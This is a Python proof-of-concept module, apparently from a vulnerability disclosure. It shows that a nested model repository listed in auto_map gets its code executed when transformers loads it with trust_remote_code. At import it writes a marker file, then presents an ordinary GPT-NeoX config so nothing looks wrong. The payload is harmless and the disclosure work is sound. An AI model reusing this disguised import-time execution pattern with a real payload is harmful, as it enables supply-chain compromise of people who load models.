"""Payload module shipped inside the second repository (B) named by the model package.

`transformers` imports this file as soon as the victim's model load performs

    AutoConfig.from_pretrained(<B>, trust_remote_code=True)

because B's `config.json` lists it in `auto_map` -> `"AutoConfig"`.  Everything at
module level therefore runs with the victim process's privileges, before any
class is looked up.

The payload is deliberately harmless: it writes one marker file.  It opens no
socket, starts no process and touches nothing else.

After the module body has run, the class below keeps the victim's load going
normally: it is an ordinary GPT-NeoX configuration, so nothing looks wrong.
"""

import datetime
import pathlib

from transformers import GPTNeoXConfig

MARKER = pathlib.Path("/tmp/sakana_nested_name_or_path_marker")

MARKER.write_text(
    "arbitrary code from repository B executed at "
    + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    + "\n"
)

print()
print("[PoC] code from repository B executed (module listed in B's auto_map)")
print("[PoC] marker written:", MARKER)
print()


class PoCStableLMConfig(GPTNeoXConfig):
    """Text-encoder configuration of B - a plain GPT-NeoX config."""

    model_type = "gpt_neox"
